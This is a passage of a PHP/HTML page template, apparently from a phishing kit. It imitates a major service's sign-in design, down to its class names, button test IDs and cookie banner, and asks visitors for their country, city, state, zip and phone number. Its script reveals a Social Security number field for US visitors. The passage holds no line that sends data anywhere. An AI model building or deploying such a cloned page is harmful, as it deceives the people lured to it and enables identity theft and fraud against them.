                                            <option value="FJ" <?= ($_SESSION['Countrynya'] === 'FJ') ? "selected" : "" ?>>Fiji</option>
                                            <option value="FI" <?= ($_SESSION['Countrynya'] === 'FI') ? "selected" : "" ?>>Finland</option>
                                            <option value="FR" <?= ($_SESSION['Countrynya'] === 'FR') ? "selected" : "" ?>>France</option>
                                            <option value="GF" <?= ($_SESSION['Countrynya'] === 'GF') ? "selected" : "" ?>>French Guiana</option>
                                            <option value="PF" <?= ($_SESSION['Countrynya'] === 'PF') ? "selected" : "" ?>>French Polynesia</option>
                                            <option value="TF" <?= ($_SESSION['Countrynya'] === 'TF') ? "selected" : "" ?>>French Southern Territories</option>
                                            <option value="GA" <?= ($_SESSION['Countrynya'] === 'GA') ? "selected" : "" ?>>Gabon</option>
                                            <option value="GM" <?= ($_SESSION['Countrynya'] === 'GM') ? "selected" : "" ?>>Gambia, The</option>
                                            <option value="GE" <?= ($_SESSION['Countrynya'] === 'GE') ? "selected" : "" ?>>Georgia</option>
                                            <option value="DE" <?= ($_SESSION['Countrynya'] === 'DE') ? "selected" : "" ?>>Germany</option>
                                            <option value="GH" <?= ($_SESSION['Countrynya'] === 'GH') ? "selected" : "" ?>>Ghana</option>
                                            <option value="GI" <?= ($_SESSION['Countrynya'] === 'GI') ? "selected" : "" ?>>Gibraltar</option>
                                            <option value="GR" <?= ($_SESSION['Countrynya'] === 'GR') ? "selected" : "" ?>>Greece</option>
                                            <option value="GL" <?= ($_SESSION['Countrynya'] === 'GL') ? "selected" : "" ?>>Greenland</option>
                                            <option value="GD" <?= ($_SESSION['Countrynya'] === 'GD') ? "selected" : "" ?>>Grenada</option>
                                            <option value="GP" <?= ($_SESSION['Countrynya'] === 'GP') ? "selected" : "" ?>>Guadeloupe</option>
                                            <option value="GU" <?= ($_SESSION['Countrynya'] === 'GU') ? "selected" : "" ?>>Guam</option>
                                            <option value="GT" <?= ($_SESSION['Countrynya'] === 'GT') ? "selected" : "" ?>>Guatemala</option>
                                            <option value="GG" <?= ($_SESSION['Countrynya'] === 'GG') ? "selected" : "" ?>>Guernsey</option>
                                            <option value="GN" <?= ($_SESSION['Countrynya'] === 'GN') ? "selected" : "" ?>>Guinea</option>
                                            <option value="GW" <?= ($_SESSION['Countrynya'] === 'GW') ? "selected" : "" ?>>Guinea-Bissau</option>
                                            <option value="GY" <?= ($_SESSION['Countrynya'] === 'GY') ? "selected" : "" ?>>Guyana</option>
                                            <option value="HT" <?= ($_SESSION['Countrynya'] === 'HT') ? "selected" : "" ?>>Haiti</option>
                                            <option value="HM" <?= ($_SESSION['Countrynya'] === 'HM') ? "selected" : "" ?>>Heard Island and the McDonald Islands</option>
                                            <option value="VA" <?= ($_SESSION['Countrynya'] === 'VA') ? "selected" : "" ?>>Holy See</option>
                                            <option value="HN" <?= ($_SESSION['Countrynya'] === 'HN') ? "selected" : "" ?>>Honduras</option>
                                            <option value="HK" <?= ($_SESSION['Countrynya'] === 'HK') ? "selected" : "" ?>>Hong Kong</option>
                                            <option value="HU" <?= ($_SESSION['Countrynya'] === 'HU') ? "selected" : "" ?>>Hungary</option>
                                            <option value="IS" <?= ($_SESSION['Countrynya'] === 'IS') ? "selected" : "" ?>>Iceland</option>
                                            <option value="IN" <?= ($_SESSION['Countrynya'] === 'IN') ? "selected" : "" ?>>India</option>
                                            <option value="ID" <?= ($_SESSION['Countrynya'] === 'ID') ? "selected" : "" ?>>Indonesia</option>
                                            <option value="IQ" <?= ($_SESSION['Countrynya'] === 'IQ') ? "selected" : "" ?>>Iraq</option>
                                            <option value="IE" <?= ($_SESSION['Countrynya'] === 'IE') ? "selected" : "" ?>>Ireland</option>
                                            <option value="IM" <?= ($_SESSION['Countrynya'] === 'IM') ? "selected" : "" ?>>Isle of Man</option>
                                            <option value="IL" <?= ($_SESSION['Countrynya'] === 'IL') ? "selected" : "" ?>>Israel</option>
                                            <option value="IT" <?= ($_SESSION['Countrynya'] === 'IT') ? "selected" : "" ?>>Italy</option>
                                            <option value="JM" <?= ($_SESSION['Countrynya'] === 'JM') ? "selected" : "" ?>>Jamaica</option>
                                            <option value="JP" <?= ($_SESSION['Countrynya'] === 'JP') ? "selected" : "" ?>>Japan</option>
                                            <option value="JE" <?= ($_SESSION['Countrynya'] === 'JE') ? "selected" : "" ?>>Jersey</option>
                                            <option value="JO" <?= ($_SESSION['Countrynya'] === 'JO') ? "selected" : "" ?>>Jordan</option>
                                            <option value="KZ" <?= ($_SESSION['Countrynya'] === 'KZ') ? "selected" : "" ?>>Kazakhstan</option>
                                            <option value="KE" <?= ($_SESSION['Countrynya'] === 'KE') ? "selected" : "" ?>>Kenya</option>
                                            <option value="KI" <?= ($_SESSION['Countrynya'] === 'KI') ? "selected" : "" ?>>Kiribati</option>
                                            <option value="XK" <?= ($_SESSION['Countrynya'] === 'XK') ? "selected" : "" ?>>Kosovo</option>
                                            <option value="KW" <?= ($_SESSION['Countrynya'] === 'KW') ? "selected" : "" ?>>Kuwait</option>
                                            <option value="KG" <?= ($_SESSION['Countrynya'] === 'KG') ? "selected" : "" ?>>Kyrgyzstan</option>
                                            <option value="LA" <?= ($_SESSION['Countrynya'] === 'LA') ? "selected" : "" ?>>Lao People's Democratic Republic</option>
                                            <option value="LV" <?= ($_SESSION['Countrynya'] === 'LV') ? "selected" : "" ?>>Latvia</option>
                                            <option value="LB" <?= ($_SESSION['Countrynya'] === 'LB') ? "selected" : "" ?>>Lebanon</option>
                                            <option value="LS" <?= ($_SESSION['Countrynya'] === 'LS') ? "selected" : "" ?>>Lesotho</option>
                                            <option value="LR" <?= ($_SESSION['Countrynya'] === 'LR') ? "selected" : "" ?>>Liberia</option>
                                            <option value="LY" <?= ($_SESSION['Countrynya'] === 'LY') ? "selected" : "" ?>>Libya</option>
                                            <option value="LI" <?= ($_SESSION['Countrynya'] === 'LI') ? "selected" : "" ?>>Liechtenstein</option>
                                            <option value="LT" <?= ($_SESSION['Countrynya'] === 'LT') ? "selected" : "" ?>>Lithuania</option>
                                            <option value="LU" <?= ($_SESSION['Countrynya'] === 'LU') ? "selected" : "" ?>>Luxembourg</option>
                                            <option value="MO" <?= ($_SESSION['Countrynya'] === 'MO') ? "selected" : "" ?>>Macao</option>
                                            <option value="MK" <?= ($_SESSION['Countrynya'] === 'MK') ? "selected" : "" ?>>Macedonia, The Former Yugoslav Republic of</option>
                                            <option value="MG" <?= ($_SESSION['Countrynya'] === 'MG') ? "selected" : "" ?>>Madagascar</option>
                                            <option value="MW" <?= ($_SESSION['Countrynya'] === 'MW') ? "selected" : "" ?>>Malawi</option>
                                            <option value="MY" <?= ($_SESSION['Countrynya'] === 'MY') ? "selected" : "" ?>>Malaysia</option>
                                            <option value="MV" <?= ($_SESSION['Countrynya'] === 'MV') ? "selected" : "" ?>>Maldives</option>
                                            <option value="ML" <?= ($_SESSION['Countrynya'] === 'ML') ? "selected" : "" ?>>Mali</option>
                                            <option value="MT" <?= ($_SESSION['Countrynya'] === 'MT') ? "selected" : "" ?>>Malta</option>
                                            <option value="MH" <?= ($_SESSION['Countrynya'] === 'MH') ? "selected" : "" ?>>Marshall Islands</option>
                                            <option value="MQ" <?= ($_SESSION['Countrynya'] === 'MQ') ? "selected" : "" ?>>Martinique</option>
                                            <option value="MR" <?= ($_SESSION['Countrynya'] === 'MR') ? "selected" : "" ?>>Mauritania</option>
                                            <option value="MU" <?= ($_SESSION['Countrynya'] === 'MU') ? "selected" : "" ?>>Mauritius</option>
                                            <option value="YT" <?= ($_SESSION['Countrynya'] === 'YT') ? "selected" : "" ?>>Mayotte</option>
                                            <option value="MX" <?= ($_SESSION['Countrynya'] === 'MX') ? "selected" : "" ?>>Mexico</option>
                                            <option value="FM" <?= ($_SESSION['Countrynya'] === 'FM') ? "selected" : "" ?>>Micronesia, Federated States of</option>
                                            <option value="MD" <?= ($_SESSION['Countrynya'] === 'MD') ? "selected" : "" ?>>Moldova, Republic of</option>
                                            <option value="MC" <?= ($_SESSION['Countrynya'] === 'MC') ? "selected" : "" ?>>Monaco</option>
                                            <option value="MN" <?= ($_SESSION['Countrynya'] === 'MN') ? "selected" : "" ?>>Mongolia</option>
                                            <option value="ME" <?= ($_SESSION['Countrynya'] === 'ME') ? "selected" : "" ?>>Montenegro</option>
                                            <option value="MS" <?= ($_SESSION['Countrynya'] === 'MS') ? "selected" : "" ?>>Montserrat</option>
                                            <option value="MA" <?= ($_SESSION['Countrynya'] === 'MA') ? "selected" : "" ?>>Morocco</option>
                                            <option value="MZ" <?= ($_SESSION['Countrynya'] === 'MZ') ? "selected" : "" ?>>Mozambique</option>
                                            <option value="MM" <?= ($_SESSION['Countrynya'] === 'MM') ? "selected" : "" ?>>Myanmar</option>
                                            <option value="NA" <?= ($_SESSION['Countrynya'] === 'NA') ? "selected" : "" ?>>Namibia</option>
                                            <option value="NR" <?= ($_SESSION['Countrynya'] === 'NR') ? "selected" : "" ?>>Nauru</option>
                                            <option value="NP" <?= ($_SESSION['Countrynya'] === 'NP') ? "selected" : "" ?>>Nepal</option>
                                            <option value="NL" <?= ($_SESSION['Countrynya'] === 'NL') ? "selected" : "" ?>>Netherlands</option>
                                            <option value="AN" <?= ($_SESSION['Countrynya'] === 'AN') ? "selected" : "" ?>>Netherlands Antilles</option>
                                            <option value="NC" <?= ($_SESSION['Countrynya'] === 'NC') ? "selected" : "" ?>>New Caledonia</option>
                                            <option value="NZ" <?= ($_SESSION['Countrynya'] === 'NZ') ? "selected" : "" ?>>New Zealand</option>
                                            <option value="NI" <?= ($_SESSION['Countrynya'] === 'NI') ? "selected" : "" ?>>Nicaragua</option>
                                            <option value="NE" <?= ($_SESSION['Countrynya'] === 'NE') ? "selected" : "" ?>>Niger</option>
                                            <option value="NG" <?= ($_SESSION['Countrynya'] === 'NG') ? "selected" : "" ?>>Nigeria</option>
                                            <option value="NU" <?= ($_SESSION['Countrynya'] === 'NU') ? "selected" : "" ?>>Niue</option>
                                            <option value="NF" <?= ($_SESSION['Countrynya'] === 'NF') ? "selected" : "" ?>>Norfolk Island</option>
                                            <option value="MP" <?= ($_SESSION['Countrynya'] === 'MP') ? "selected" : "" ?>>Northern Mariana Islands</option>
                                            <option value="NO" <?= ($_SESSION['Countrynya'] === 'NO') ? "selected" : "" ?>>Norway</option>
                                            <option value="OM" <?= ($_SESSION['Countrynya'] === 'OM') ? "selected" : "" ?>>Oman</option>
                                            <option value="PK" <?= ($_SESSION['Countrynya'] === 'PK') ? "selected" : "" ?>>Pakistan</option>
                                            <option value="PW" <?= ($_SESSION['Countrynya'] === 'PW') ? "selected" : "" ?>>Palau</option>
                                            <option value="PS" <?= ($_SESSION['Countrynya'] === 'PS') ? "selected" : "" ?>>Palestinian Territories</option>
                                            <option value="PA" <?= ($_SESSION['Countrynya'] === 'PA') ? "selected" : "" ?>>Panama</option>
                                            <option value="PG" <?= ($_SESSION['Countrynya'] === 'PG') ? "selected" : "" ?>>Papua New Guinea</option>
                                            <option value="PY" <?= ($_SESSION['Countrynya'] === 'PY') ? "selected" : "" ?>>Paraguay</option>
                                            <option value="PE" <?= ($_SESSION['Countrynya'] === 'PE') ? "selected" : "" ?>>Peru</option>
                                            <option value="PH" <?= ($_SESSION['Countrynya'] === 'PH') ? "selected" : "" ?>>Philippines</option>
                                            <option value="PN" <?= ($_SESSION['Countrynya'] === 'PN') ? "selected" : "" ?>>Pitcairn</option>
                                            <option value="PL" <?= ($_SESSION['Countrynya'] === 'PL') ? "selected" : "" ?>>Poland</option>
                                            <option value="PT" <?= ($_SESSION['Countrynya'] === 'PT') ? "selected" : "" ?>>Portugal</option>
                                            <option value="PR" <?= ($_SESSION['Countrynya'] === 'PR') ? "selected" : "" ?>>Puerto Rico</option>
                                            <option value="QA" <?= ($_SESSION['Countrynya'] === 'QA') ? "selected" : "" ?>>Qatar</option>
                                            <option value="KR" <?= ($_SESSION['Countrynya'] === 'KR') ? "selected" : "" ?>>Republic of Korea</option>
                                            <option value="RE" <?= ($_SESSION['Countrynya'] === 'RE') ? "selected" : "" ?>>Reunion</option>
                                            <option value="RO" <?= ($_SESSION['Countrynya'] === 'RO') ? "selected" : "" ?>>Romania</option>
                                            <option value="RU" <?= ($_SESSION['Countrynya'] === 'RU') ? "selected" : "" ?>>Russian Federation</option>
                                            <option value="RW" <?= ($_SESSION['Countrynya'] === 'RW') ? "selected" : "" ?>>Rwanda</option>
                                            <option value="BL" <?= ($_SESSION['Countrynya'] === 'BL') ? "selected" : "" ?>>Saint Barthelemy</option>
                                            <option value="SH" <?= ($_SESSION['Countrynya'] === 'SH') ? "selected" : "" ?>>Saint Helena, Ascension and Tristan da Cunha</option>
                                            <option value="KN" <?= ($_SESSION['Countrynya'] === 'KN') ? "selected" : "" ?>>Saint Kitts and Nevis</option>
                                            <option value="LC" <?= ($_SESSION['Countrynya'] === 'LC') ? "selected" : "" ?>>Saint Lucia</option>
                                            <option value="MF" <?= ($_SESSION['Countrynya'] === 'MF') ? "selected" : "" ?>>Saint Martin</option>
                                            <option value="PM" <?= ($_SESSION['Countrynya'] === 'PM') ? "selected" : "" ?>>Saint Pierre and Miquelon</option>
                                            <option value="VC" <?= ($_SESSION['Countrynya'] === 'VC') ? "selected" : "" ?>>Saint Vincent and the Grenadines</option>
                                            <option value="WS" <?= ($_SESSION['Countrynya'] === 'WS') ? "selected" : "" ?>>Samoa</option>
                                            <option value="SM" <?= ($_SESSION['Countrynya'] === 'SM') ? "selected" : "" ?>>San Marino</option>
                                            <option value="ST" <?= ($_SESSION['Countrynya'] === 'ST') ? "selected" : "" ?>>Sao Tome and Principe</option>
                                            <option value="SA" <?= ($_SESSION['Countrynya'] === 'SA') ? "selected" : "" ?>>Saudi Arabia</option>
                                            <option value="SN" <?= ($_SESSION['Countrynya'] === 'SN') ? "selected" : "" ?>>Senegal</option>
                                            <option value="RS" <?= ($_SESSION['Countrynya'] === 'RS') ? "selected" : "" ?>>Serbia</option>
                                            <option value="SC" <?= ($_SESSION['Countrynya'] === 'SC') ? "selected" : "" ?>>Seychelles</option>
                                            <option value="SL" <?= ($_SESSION['Countrynya'] === 'SL') ? "selected" : "" ?>>Sierra Leone</option>
                                            <option value="SG" <?= ($_SESSION['Countrynya'] === 'SG') ? "selected" : "" ?>>Singapore</option>
                                            <option value="SX" <?= ($_SESSION['Countrynya'] === 'SX') ? "selected" : "" ?>>Sint Maarten</option>
                                            <option value="SK" <?= ($_SESSION['Countrynya'] === 'SK') ? "selected" : "" ?>>Slovakia</option>
                                            <option value="SI" <?= ($_SESSION['Countrynya'] === 'SI') ? "selected" : "" ?>>Slovenia</option>
                                            <option value="SB" <?= ($_SESSION['Countrynya'] === 'SB') ? "selected" : "" ?>>Solomon Islands</option>
                                            <option value="SO" <?= ($_SESSION['Countrynya'] === 'SO') ? "selected" : "" ?>>Somalia</option>
                                            <option value="ZA" <?= ($_SESSION['Countrynya'] === 'ZA') ? "selected" : "" ?>>South Africa</option>
                                            <option value="GS" <?= ($_SESSION['Countrynya'] === 'GS') ? "selected" : "" ?>>South Georgia and the South Sandwich Islands</option>
                                            <option value="ES" <?= ($_SESSION['Countrynya'] === 'ES') ? "selected" : "" ?>>Spain</option>
                                            <option value="LK" <?= ($_SESSION['Countrynya'] === 'LK') ? "selected" : "" ?>>Sri Lanka</option>
                                            <option value="SR" <?= ($_SESSION['Countrynya'] === 'SR') ? "selected" : "" ?>>Suriname</option>
                                            <option value="SJ" <?= ($_SESSION['Countrynya'] === 'SJ') ? "selected" : "" ?>>Svalbard and Jan Mayen</option>
                                            <option value="SZ" <?= ($_SESSION['Countrynya'] === 'SZ') ? "selected" : "" ?>>Swaziland</option>
                                            <option value="SE" <?= ($_SESSION['Countrynya'] === 'SE') ? "selected" : "" ?>>Sweden</option>
                                            <option value="CH" <?= ($_SESSION['Countrynya'] === 'CH') ? "selected" : "" ?>>Switzerland</option>
                                            <option value="TW" <?= ($_SESSION['Countrynya'] === 'TW') ? "selected" : "" ?>>Taiwan</option>
                                            <option value="TJ" <?= ($_SESSION['Countrynya'] === 'TJ') ? "selected" : "" ?>>Tajikistan</option>
                                            <option value="TZ" <?= ($_SESSION['Countrynya'] === 'TZ') ? "selected" : "" ?>>Tanzania, United Republic of</option>
                                            <option value="TH" <?= ($_SESSION['Countrynya'] === 'TH') ? "selected" : "" ?>>Thailand</option>
                                            <option value="TL" <?= ($_SESSION['Countrynya'] === 'TL') ? "selected" : "" ?>>Timor-leste</option>
                                            <option value="TG" <?= ($_SESSION['Countrynya'] === 'TG') ? "selected" : "" ?>>Togo</option>
                                            <option value="TK" <?= ($_SESSION['Countrynya'] === 'TK') ? "selected" : "" ?>>Tokelau</option>
                                            <option value="TO" <?= ($_SESSION['Countrynya'] === 'TO') ? "selected" : "" ?>>Tonga</option>
                                            <option value="TT" <?= ($_SESSION['Countrynya'] === 'TT') ? "selected" : "" ?>>Trinidad and Tobago</option>
                                            <option value="TN" <?= ($_SESSION['Countrynya'] === 'TN') ? "selected" : "" ?>>Tunisia</option>
                                            <option value="TR" <?= ($_SESSION['Countrynya'] === 'TR') ? "selected" : "" ?>>Turkey</option>
                                            <option value="TM" <?= ($_SESSION['Countrynya'] === 'TM') ? "selected" : "" ?>>Turkmenistan</option>
                                            <option value="TC" <?= ($_SESSION['Countrynya'] === 'TC') ? "selected" : "" ?>>Turks and Caicos Islands</option>
                                            <option value="TV" <?= ($_SESSION['Countrynya'] === 'TV') ? "selected" : "" ?>>Tuvalu</option>
                                            <option value="UG" <?= ($_SESSION['Countrynya'] === 'UG') ? "selected" : "" ?>>Uganda</option>
                                            <option value="UA" <?= ($_SESSION['Countrynya'] === 'UA') ? "selected" : "" ?>>Ukraine</option>
                                            <option value="AE" <?= ($_SESSION['Countrynya'] === 'AE') ? "selected" : "" ?>>United Arab Emirates</option>
                                            <option value="GB" <?= ($_SESSION['Countrynya'] === 'GB') ? "selected" : "" ?>>United Kingdom</option>
                                            <option value="US" <?= ($_SESSION['Countrynya'] === 'US') ? "selected" : "" ?>>United States</option>
                                            <option value="UM" <?= ($_SESSION['Countrynya'] === 'UM') ? "selected" : "" ?>>United States Minor Outlying Islands</option>
                                            <option value="UY" <?= ($_SESSION['Countrynya'] === 'UY') ? "selected" : "" ?>>Uruguay</option>
                                            <option value="UZ" <?= ($_SESSION['Countrynya'] === 'UZ') ? "selected" : "" ?>>Uzbekistan</option>
                                            <option value="VU" <?= ($_SESSION['Countrynya'] === 'VU') ? "selected" : "" ?>>Vanuatu</option>
                                            <option value="VE" <?= ($_SESSION['Countrynya'] === 'VE') ? "selected" : "" ?>>Venezuela</option>
                                            <option value="VN" <?= ($_SESSION['Countrynya'] === 'VN') ? "selected" : "" ?>>Vietnam</option>
                                            <option value="VG" <?= ($_SESSION['Countrynya'] === 'VG') ? "selected" : "" ?>>Virgin Islands, British</option>
                                            <option value="VI" <?= ($_SESSION['Countrynya'] === 'VI') ? "selected" : "" ?>>Virgin Islands, U.S.</option>
                                            <option value="WF" <?= ($_SESSION['Countrynya'] === 'WF') ? "selected" : "" ?>>Wallis and Futuna</option>
                                            <option value="EH" <?= ($_SESSION['Countrynya'] === 'EH') ? "selected" : "" ?>>Western Sahara</option>
                                            <option value="YE" <?= ($_SESSION['Countrynya'] === 'YE') ? "selected" : "" ?>>Yemen</option>
                                            <option value="ZM" <?= ($_SESSION['Countrynya'] === 'ZM') ? "selected" : "" ?>>Zambia</option>
                                            <option value="ZW" <?= ($_SESSION['Countrynya'] === 'ZW') ? "selected" : "" ?>>Zimbabwe</option>
                                        </select>
                                    </div>
                                    <div class="row  p-1 pt-2">
                                        <div class="form-group col-md-5">
                                            <label for="inputCity" style="font-weight:600;">City</label>
                                            <input type="text" class="form-control" name="city" id="inputCity" placeholder="City" required>
                                        </div>
                                        <div class="form-group col-md-4">
                                            <label for="inputState" style="font-weight:600;">State</label>
                                            <div id="stateField"></div>
                                        </div>
                                        <div class="form-group col-md-3">
                                            <label for="inputZip" style="font-weight:600;">Zip</label>
                                            <input type="text" class="form-control" name="zipcode" id="inputZip" placeholder="XXXXX" required>
                                        </div>
                                    </div>
                                    <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-2-_115h1mf cds-2-_8lqlrb"><button data-testid="password-submit-button" name="Next" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(1, 76, 236); --interactable-hovered-opacity: 0.92; --interactable-pressed-background: rgb(1, 72, 221); --interactable-pressed-opacity: 0.86; --interactable-disabled-background: rgb(128, 169, 255);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Continue</span></span></span></button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div data-testname="open-banner" data-testid="banner-container" class="cds-flex-f1g67tkn cds-fixed-f1v5p9l4" style="width: 100%; position: fixed; bottom: 0px; z-index: 3; transition: bottom 500ms ease 0s; will-change: bottom;">
                <div id="cookie-banner" class="cookie-banner cds-flex-f1g67tkn cds-center-czxavit cds-backgroundAlternate-b1o0kdmt" style="width: 100%;">
                    <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-space-between-s1vbz1 cds-3-_1ixgcz3 cds-3-_1mvq9l2 cds-6-_1iifjn6 cds-6-_1ts70zl" style="max-width: 800px; width: 100%;">
                        <p class="cds-typographyResets-t1xhpuq2 cds-label2-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0-_vhy4ik cds-1-_7ojgr9">
                            We use strictly necessary cookies to enable essential functions, such as security and
                            authentication. For more information, see our <a class="cds-link cds-link-l17zyfmx" href="#" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Cookie
                                    Policy</span></a>.</p><button data-testid="dismiss-button" class="dismiss-button cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(1, 76, 236); --interactable-hovered-opacity: 0.92; --interactable-pressed-background: rgb(1, 72, 221); --interactable-pressed-opacity: 0.86; --interactable-disabled-background: rgb(128, 169, 255);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Dismiss</span></span></span></button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="portalRoot" style="z-index: 100001; position: relative; display: flex;">
        <div data-testid="portal-modal-container" id="modalsContainer" style="z-index: 3;"></div>
        <div data-testid="portal-toast-container" id="toastsContainer" style="z-index: 6;"></div>
        <div data-testid="portal-alert-container" id="alertsContainer" style="z-index: 7;">
            <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue60)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray5)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50));">
            </div>
        </div>
        <div data-testid="portal-tooltip-container" id="tooltipContainer" style="z-index: 5;"></div>
    </div>
    <div id="cds-hexagon-clipPath-container" aria-hidden="true" style="height: 0px; width: 0px;"><svg height="0" viewBox="0 0 66 62" width="0">
            <defs>
                <clippath clipPathUnits="objectBoundingBox" id="cds-hexagon-avatar-clipper" transform="scale(0.015151515151515152 0.016129032258064516)">
                    <path d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z">
                    </path>
                </clippath>
            </defs>
        </svg></div>
</body>
<script>
    $(document).ready(function() {
        function handleCountryChange() {
            var countrySelect = $('#Country');
            var stateField = $('#stateField');
            var ssnField = document.getElementById('ssnField');
            
            if (!ssnField) {
                console.error('SSN field not found!');
                return;
            }
            
            // Clear the stateField before adding new elements
            stateField.empty();
            
            if (countrySelect.val() === 'US') {
                // If United States is selected, create state dropdown and show SSN field
                var stateDropdown = $('<select></select>', {
                    id: 'State',
                    name: 'State',
                    class: 'form-select'
                });

                // Add all states for the United States
                var states = ["Alabama", "Alaska", "American Samoa", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "District of Columbia", "Federated States of Micronesia", "Florida", "Georgia", "Guam", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Marshall Islands", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Northern Mariana Islands", "Ohio", "Oklahoma", "Oregon", "Palau", "Pennsylvania", "Puerto Rico", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virgin Islands", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "Armed Forces - AA", "Armed Forces - AE", "Armed Forces - AP"];
                for (var i = 0; i < states.length; i++) {
                    var option = $('<option></option>', {
                        value: states[i].toLowerCase().replace(/ /g, '-'),
                        text: states[i]
                    });
                    stateDropdown.append(option);
                }

                stateField.append(stateDropdown);
                ssnField.style.display = 'block';
            } else {
                // If another country is selected, create state input and hide SSN field
                var stateInput = $('<input></input>', {
                    type: 'text',
                    id: 'State',
                    name: 'State',
                    placeholder: 'State',
                    class: 'form-control'
                });
                stateField.append(stateInput);
                ssnField.style.display = 'none';
            }
        }

        // Bind the change event to the function
        $('#Country').change(handleCountryChange);

        // Call the function on page load to set the initial state
        handleCountryChange();
    });


    $(document).ready(function() {
        const bannercookie = document.querySelector('.cookie-banner');
        const toggleButton = document.querySelector('.dismiss-button');

        toggleButton.addEventListener('click', function() {
            bannercookie.style.display = 'none';
        });
    });

    $(document).ready(function() {
        $('#phoneNumber').on('input', function(e) {
            // Remove non-numeric characters from the input
            let phoneNumber = $(this).val().replace(/\D/g, '');

            // Check for common phone number formats and apply formatting
            if (phoneNumber.length >= 4 && phoneNumber.length <= 7) {
                // Format as XXX-XXXX
                phoneNumber = phoneNumber.replace(/(\d{3})(\d{1,4})/, '$1-$2');
            } else if (phoneNumber.length >= 8) {
                // Format as (XXX) XXX-XXXX
                phoneNumber = phoneNumber.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
            }

            // Update the input field's value with the formatted phone number
            $(this).val(phoneNumber);
        }).on('keypress', function(event) {
            // Allow only numeric characters and certain control keys
            let charCode = (event.which) ? event.which : event.keyCode;
            if (charCode < 48 || charCode > 57) {
                event.preventDefault();
            }
        });
    });
</script>


</html>